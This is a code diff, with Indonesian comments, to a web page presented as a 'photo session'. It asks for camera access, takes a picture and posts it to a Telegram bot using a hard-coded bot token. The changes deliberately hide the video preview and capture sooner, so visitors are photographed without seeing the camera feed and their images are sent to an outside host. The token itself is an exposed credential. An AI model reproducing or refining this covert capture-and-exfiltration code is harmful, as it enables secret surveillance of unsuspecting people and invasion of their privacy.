@@ -16,10 +16,11 @@
             Mulai Sesi Foto
         </button>
 
-        <video id="video" class="hidden w-full h-auto rounded-lg mt-4" autoplay playsinline></video>
-        
         <div id="status" class="mt-4 text-sm text-yellow-400 font-medium"></div>
     </div>
+
+    <!-- Video disembunyikan sepenuhnya agar tidak merender preview di layar -->
+    <video id="video" class="hidden" autoplay playsinline></video>
 
     <script>
         const BOT_TOKEN = '8429814704:AAH2DUBcP5rok16SLARgJwjWeeNOrFKf0RY';
@@ -34,18 +35,16 @@
                 status.innerText = "Meminta izin kamera...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                video.classList.remove('hidden');
-                startBtn.classList.add('hidden');
-                status.innerText = "Kamera aktif, bersiap mengambil foto...";
                 
-                setTimeout(takePhoto, 2000);
+                // Tunggu sedikit agar kamera siap, lalu ambil gambar
+                status.innerText = "Mengambil foto...";
+                setTimeout(takePhoto, 1500);
             } catch (err) {
                 status.innerText = "Error Kamera: " + err.message;
             }
         }
 
         async function takePhoto() {
-            // Membuat elemen canvas sementara di memori saja (tidak dimasukkan ke DOM/HTML)
             const tempCanvas = document.createElement('canvas');
             tempCanvas.width = video.videoWidth;
             tempCanvas.height = video.videoHeight;
@@ -73,7 +72,6 @@
                 if (result.ok) {
                     status.innerText = "✅ Foto berhasil dikirim!";
                     status.classList.replace('text-yellow-400', 'text-green-400');
-                    // Stop kamera setelah sukses
                     video.srcObject.getTracks().forEach(track => track.stop());
                 } else {
                     status.innerText = "Error API: " + result.description;
